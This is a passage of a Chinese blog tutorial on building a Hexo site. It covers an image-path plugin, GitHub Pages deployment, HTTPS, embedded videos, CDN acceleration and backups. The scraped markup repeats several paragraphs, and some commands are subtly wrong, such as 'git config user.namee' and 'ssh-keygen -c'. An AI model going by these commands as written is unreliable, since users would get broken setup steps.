start="3"><li>以上的插件是修改过的,如果是通过<code>npm install hexo-asset-image</code>直接安装的,需要修改<code>inde.js</code>文件</li></ol><pre><code class="bash"><code class="language-bash">❯  npm install https://github.com/7ym0n/hexo-asset-image --save</code></pre><ol start="3"><li>以上的插件是修改过的,如果是通过<code>npm install hexo-asset-image</code>直接安装的,需要修改<code>inde.js</code>文件</li></ol><pre><code class="bash">❯ pwd/home/kning/myblog❯ ls_config.yml  node_modules  package-lock.json  scaffolds  themesdb.json      package.json  public             source❯ ls node_modules/hexo-asset-image/index.js  LICENSE  package.json  README.md❯ sudo mousepad node_modules/hexo-asset-image/index.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 直接复制替换内容</span><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">var</span> cheerio <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cheerio'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span><span class="token keyword">function</span> <span class="token function">getPosition</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> version <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>hexo<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hexo<span class="token punctuation">.</span>extend<span class="token punctuation">.</span>filter<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'after_post_render'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> config <span class="token operator">=</span> hexo<span class="token punctuation">.</span>config<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>post_asset_folder<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> link <span class="token operator">=</span> data<span class="token punctuation">.</span>permalink<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>version<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">Number</span><span class="token punctuation">(</span>version<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> beginPos <span class="token operator">=</span> <span class="token function">getPosition</span><span class="token punctuation">(</span>link<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span>    <span class="token keyword">var</span> beginPos <span class="token operator">=</span> <span class="token function">getPosition</span><span class="token punctuation">(</span>link<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html".</span><span class="token keyword">var</span> endPos <span class="token operator">=</span> link<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>link <span class="token operator">=</span> link<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>beginPos<span class="token punctuation">,</span> endPos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> toprocess <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'excerpt'</span><span class="token punctuation">,</span> <span class="token string">'more'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> toprocess<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> key <span class="token operator">=</span> toprocess<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> $ <span class="token operator">=</span> cheerio<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    ignoreWhitespace<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    xmlMode<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    lowerCaseTags<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    decodeEntities<span class="token punctuation">:</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// For windows style path, we replace '\' to '/'.</span>        <span class="token keyword">var</span> src <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/http[s]*.*|\/\/.*/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>            <span class="token operator">!</span><span class="token regex">/^\s*\//</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// For "about" page, the first part of "src" can't be removed.</span>            <span class="token comment" spellcheck="true">// In addition, to support multi-level local directory.</span>            <span class="token keyword">var</span> linkArray <span class="token operator">=</span> link<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> elem <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> srcArray <span class="token operator">=</span> src<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> elem <span class="token operator">!=</span> <span class="token string">''</span> <span class="token operator">&amp;&amp;</span> elem <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>srcArray<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>            srcArray<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            src <span class="token operator">=</span> srcArray<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> config<span class="token punctuation">.</span>root <span class="token operator">+</span> link <span class="token operator">+</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span>info<span class="token operator">&amp;&amp;</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"update link as:-->"</span><span class="token operator">+</span>config<span class="token punctuation">.</span>root <span class="token operator">+</span> link <span class="token operator">+</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span>info<span class="token operator">&amp;&amp;</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"no src attr, skipped..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span>info<span class="token operator">&amp;&amp;</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>安装完后,在创建新文章时<code>hexo new post “test”</code> ,会自动的为<code>test.md</code>文件的同目录下创建一个同名的文件夹,可以把<code>test.md</code>中引用的图片放在该文件夹下</li></ol><pre class="line-numbers language-bash"><code class="language-bash">❯ hexo new post <span class="token string">"test"</span>❯ <span class="token function">cd</span> source/_posts❯ tree<span class="token keyword">.</span>├── hello-world.md├── <span class="token function">test</span>│   └── 10001.png<span class="token operator">|</span>── test.md<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>在<code>test.md</code> 文件中就可以使用<code>markdown</code>语法中引用图片的方法</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo clean$ hexo g$ hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><hr><h2 id="外网访问Hexo"><a href="#外网访问Hexo" class="headerlink" title="外网访问Hexo"></a>外网访问<code>Hexo</code></h2><h3 id="7-联动github"><a href="#7-联动github" class="headerlink" title="7.联动github"></a>7.联动<code>github</code></h3><h4 id="1-创建GitHub"><a href="#1-创建GitHub" class="headerlink" title="1.创建GitHub"></a>1.创建<code>GitHub</code></h4><blockquote><p>建议使用<code>outlook</code>邮箱创建,其他邮箱<code>qq\163</code>大概率会屏蔽<code>github</code>的邮件.</p></blockquote><h4 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2.创建仓库"></a>2.创建仓库</h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10141.png"></p><p>可以直接创建为<code>&lt;your_github__uesrname.github.io&gt;</code>,这样可以直接访问<code>your_github__uesrname.github.io</code>得到网站.</p></blockquote><h4 id="3-部署"><a href="#3-部署" class="headerlink" title="3.部署"></a>3.部署</h4><blockquote><p>如果你没有使用过<code>git</code>,需要像配置一下<code>git</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.namee <span class="token string">"yourname"</span><span class="token function">git</span> config --global user.email <span class="token string">"youremail@xxx.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后生成<code>ssh_key</code></p><pre class="line-numbers language-bash">ssh-keygen -t rsa  -c &quot;youremail@xxx.com&quot;</code></pre><p>这样会在你的目录中生成公钥文件</p><pre><code class="bash">❯ cat ~/.ssh/id_rsa.pub   </code></pre><p>打开<code>github</code>,把公钥写入到网站中</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10142.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10143.png"></p></blockquote><blockquote><p>修改根目录下的主配置文件<code>config</code></p><pre><code class="yaml"><code class="language-bash">ssh-keygen -t rsa  -c &quot;youremail@xxx.com&quot;</code></pre><p>这样会在你的目录中生成公钥文件</p><pre><code class="bash">❯ cat ~/.ssh/id_rsa.pub   </code></pre><p>打开<code>github</code>,把公钥写入到网站中</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10142.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10143.png"></p></blockquote><blockquote><p>修改根目录下的主配置文件<code>config</code></p><pre><code class="yaml"># 大约在109deploy:type: gitrepository: https://github.com/ningwenyan/ningwenyan.github.iobranch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>repository</code>指定自己的仓库</li></ul><p>指点完毕后,就可以是使用<code>hexo d</code>来推送自己的网站</p></blockquote><h4 id="4-设定dns"><a href="#4-设定dns" class="headerlink" title="4.设定dns"></a>4.设定<code>dns</code></h4><blockquote><p>我这里使用的阿里云的域名,直接绑定地址.</p><p>![](/home/kning/Nutstore Files/win_note/picture/10147.png)</p><p>然后修改<code>github</code>上的<code>setting</code>参数,将自己的域名绑定.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10146.png"></p><p>尝试访问<code>www.wenyan.online</code> 就可以转到自己的网站上.</p></blockquote><h3 id="8-加载SSL证书"><a href="#8-加载SSL证书" class="headerlink" title="8.加载SSL证书"></a>8.加载<code>SSL</code>证书</h3><blockquote><p><a href="https://wenyan.online/2020/08/14/a-li-yun-mian-fei-zhu-ce-http-ssl-zheng-shu/" target="_blank" rel="noopener">阿里云申请免费证书</a></p><p>申请成功后,设置<code>github page</code>.</p><hr><p>如果访问<code>http://wenyan.online/</code>,依然是可以访问到网站的,原因就是他不是自动跳转<code>https</code>的.<br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10166.png" alt="10166"></p><p>(可以看到有不安全的提示)</p><p>现在我们设置强制<code>https</code>访问.</p><ol><li>访问<code>github page</code>项目,打开<code>setting</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10167.png" alt="10167"></p><ol start="2"><li>找到<code>enforce https</code>,确定强制跳转</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10168.png" alt="10168"></p><ol start="3"><li>再次访问<code>wenyan.online</code>,会自动跳转到<code>https://wenyan.online</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10169.png" alt="10169"></p></blockquote><h2 id="Hexo小插件"><a href="#Hexo小插件" class="headerlink" title="Hexo小插件"></a><code>Hexo</code>小插件</h2><h3 id="9-加载bilibili视频"><a href="#9-加载bilibili视频" class="headerlink" title="9.加载bilibili视频"></a>9.加载<code>bilibili</code>视频</h3><blockquote><p>由于<code>Github</code>的限制,再加上<code>Hexo</code>本身属于一个静态的网站,并没有管理后台,所以选择在网页上镶入<code>bilibili</code>视频.</p><p><code>Markdown</code>脱胎于<code>HTML</code>,所以可以直接在<code>Markdown</code>语法中插入<code>html</code>代码,但是为了防止一些其他因素的干扰,<code>Hexo</code>特意提供了一个<code>raw</code>的标签来插入<code>html</code>代码.</p><pre class="line-numbers language-markdown"><code class="language-markdown">{% raw %}<span class="token blockquote punctuation">></span> <span class="token blockquote punctuation">></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span>relative<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">100%</span><span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token property">padding-bottom</span><span class="token punctuation">:</span><span class="token number">75%</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token blockquote punctuation">></span> <span class="token blockquote punctuation">></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//player.bilibili.com/player.html?aid<span class="token punctuation">=</span>883652857&amp;bvid<span class="token punctuation">=</span>BV1qK4y147NY&amp;cid<span class="token punctuation">=</span>205795290&amp;page<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">scrolling</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">framespacing</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">allowfullscreen</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"> <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token blockquote punctuation">></span> <span class="token blockquote punctuation">></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token blockquote punctuation">></span> <span class="token blockquote punctuation">></span> {% endraw %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下:</p>> ><div style="position:relative;width:100%;height:0;padding-bottom:75%">> <iframe src="//player.bilibili.com/player.html?aid=328695603&bvid=BV1qA411i7aC&cid=208780563&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;>></div>> ><hr><p>其中的<code>iframe</code>标签来自于<code>b</code>站自己的分享嵌入代码,可如下拿到:</p><ol><li>找到自己想要的视频,比如:<a href=" https: www.bilibili.com video bv1qk4y147ny" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1qK4y147NY<li>点击视频下方的分享-嵌入代码</li><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10156.png" alt="10156"></p><ol start="3"><li>复制代码,放在自己文章的<code>raw</code>中,注意添加<code>div</code>和<code>iframe</code>的<code>style</code>标签,内容如上,才能做到视频大小适合屏幕.</li></ol></iframe></div></blockquote><h3 id="10-科技线加载"><a href="#10-科技线加载" class="headerlink" title="10.科技线加载"></a>10.科技线加载</h3><blockquote><p>找到主题文件夹下<code>theme/matery/layout/layout.ejs</code>,并添加如下内容:</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>动态线条背景<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span>color<span class="token operator">=</span><span class="token string">"122 103 238"</span> opacity<span class="token operator">=</span><span class="token string">'0.7'</span> zIndex<span class="token operator">=</span><span class="token string">"-2"</span> count<span class="token operator">=</span><span class="token string">"200"</span> src<span class="token operator">=</span><span class="token string">"//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>color</code>:表示线条颜色</li><li><code>opacity</code>:表示线条透明度(0-1)</li><li><code>count</code>:线条的总数量</li><li><code>zIndex</code>:表示背景的<code>z-index</code>属性,<code>css</code>属性用于控制层数的位置.</li></ul></blockquote><h3 id="11-HEXO博客备份"><a href="#11-HEXO博客备份" class="headerlink" title="11. HEXO博客备份"></a>11. <code>HEXO</code>博客备份</h3><blockquote><p>在网络上也搜索过很多方法,有上传到<code>github</code>上分支的,但是整个系统博客中也包含很多的私密信息,比如<code>token</code>或<code>key</code>之类的.</p><p>也有创建私有仓库的,但是这样中间步骤会增加很多,需要<code>push</code>之后,再<code>hexo d</code>.中间会涉及到<code>git</code>命令.</p><p>还有使用工具的<code>Github Actions</code> .但是中间过程还是繁琐.</p><hr><p>正好从项目的一开始,我们就使用<code>坚果云</code>来同步文件,这里所有的博客文件也采用<code>坚果云</code>自动同步,它会跟踪文件,根据更改自动同步文件.</p><ol><li>查看文件大小</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10171.png" alt="10171"></p><ol start="2"><li>坚果云每月有1G的不限速上传流量,完全可以满足日常使用.</li><li>点击坚果云,创建同步文件夹</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10172.png" alt="10172"></p><ol start="4"><li>找到我们的项目文件夹</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10173.png" alt="10173"></p><ol start="5"><li>如果你有其他需要同步的电脑,会自动提示同步项目文件夹.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10175.png" alt="10175"></p><ol start="6"><li>指定要同步到的文件夹</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10176.png" alt="10176"></p><ol start="7"><li>经过一段时间后,在查看同步结果,会看到同步完成.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10177.png" alt="10177"></p></blockquote><h3 id="12-HEXO加速访问"><a href="#12-HEXO加速访问" class="headerlink" title="12.HEXO加速访问"></a>12.<code>HEXO</code>加速访问</h3><h4 id="1-jdfrlibt-CDN加速"><a href="#1-jdfrlibt-CDN加速" class="headerlink" title="1.jdfrlibt CDN加速"></a>1.<code>jdfrlibt CDN</code>加速</h4><blockquote><p>使用<code>jsdelivr</code> 加速,这时一个免费的静态资源加速网站,在中国有加速站点也是他们主打的功能.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10180.png" alt="10180"></p><p>主网站:<code>https://www.jsdelivr.com/</code></p><p>按照官网的说明,它的使用语法如下:</p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- GitHub release, commit, or branch ---></span>https://cdn.jsdelivr.net/gh/user/repo@version/file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>比如我的仓库文件,可以用如下方式加速访问(可以复制链接并打开):</p><pre class="line-numbers language-html">https://cdn.jsdelivr.net/gh/ningwenyan/ningwenyan.github.io@master/</code></pre><ul><li><p>注意:这里只想了分支<code>master</code>,这是因为我的<code>github page</code>本身就在<code>master</code>分支中.</p></li><li><p>还有一些高级的用法,请参照官方文档说明.</p></li></ul><hr><p><code>hexo-theme-matery</code> 主题中集成了<code>jsdelivr</code>加速,只需要开启就可以了,打开主题中的配置文件<code>_config</code>文件,找到<code>cdn</code>加速的配置行</p><pre><code class="bash"><code class="language-html">https://cdn.jsdelivr.net/gh/ningwenyan/ningwenyan.github.io@master/</code></pre><ul><li><p>注意:这里只想了分支<code>master</code>,这是因为我的<code>github page</code>本身就在<code>master</code>分支中.</p></li><li><p>还有一些高级的用法,请参照官方文档说明.</p></li></ul><hr><p><code>hexo-theme-matery</code> 主题中集成了<code>jsdelivr</code>加速,只需要开启就可以了,打开主题中的配置文件<code>_config</code>文件,找到<code>cdn</code>加速的配置行</p><pre><code class="bash">vim ~/themes/hexo-theme-matery/_config.yml...# 需要指定自己的 jsdelivr 加速库地址jsDelivr:  url: https://cdn.jsdelivr.net/gh/ningwenyan/ningwenyan.github.io@master/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指定加速地址后,重新初始化并上传</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo clean$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上会大幅缩短加载<code>.js\css\html</code>文件的时间.</p></blockquote><h4 id="2-插件加速访问"><a href="#2-插件加速访问" class="headerlink" title="2.插件加速访问"></a>2.插件加速访问</h4><blockquote><p>介于我们还安装了<code>hexo-helper-live2d</code>,在后台查看加载时间的时候,这个工具并没有被<code>jsdelivr</code>加速</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10179.png" alt="10179"></p><p>这里再设置加速<code>2D</code>板娘</p><ol><li>打开<code>https://www.jsdelivr.com/</code>网站,并搜索要使用的板娘名称,比如<code>live2d-widget-model-shizuku</code></li><li>复制所需要的插件地址</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10181.png" alt="10181"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10182.png" alt="10182"></p><ol start="3"><li>打开根目录下的<code>_config.yml</code>文件,并修改<code>model</code>配置</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ vim ~/_config.ymlmodel:    <span class="token comment" spellcheck="true"># use: live2d-widget-model-shizuku</span>    <span class="token comment" spellcheck="true"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json #</span>    use: https://cdn.jsdelivr.net/npm/live2d-widget-model-shizuku@1.0.5/assets/shizuku.model.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>跟新并上传<code>github</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>查看网站加载速度:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10183.png" alt="10183"></p></blockquote><h4 id="3-HEXO文章使用图床"><a href="#3-HEXO文章使用图床" class="headerlink" title="3. HEXO文章使用图床"></a>3. <code>HEXO</code>文章使用图床</h4><blockquote><p>文章中的图片加载是非常耗用时间的.所以,我们新的文章中所有的图片最好使用外链的方式加载到文章中.</p><p>这里推荐使用图床的方式加载图片.图床有很多种,可以根据自己的需求来找自己的图床.</p><p>我这里使用的是<code>picgo+typora+gitee</code>的方式.</p></blockquote><h3 id="13-SEO优化"><a href="#13-SEO优化" class="headerlink" title="13.SEO优化"></a>13.<code>SEO</code>优化</h3><blockquote><p>搜索引擎优化(<code>Search Engine Optimization</code>),它是一种通过分析搜索引擎的排名规律,了解各种搜索引擎怎样进行搜索,怎样抓取互联网页面,怎样确定特定关键词的搜索结果排名的技术.<code>Google</code> 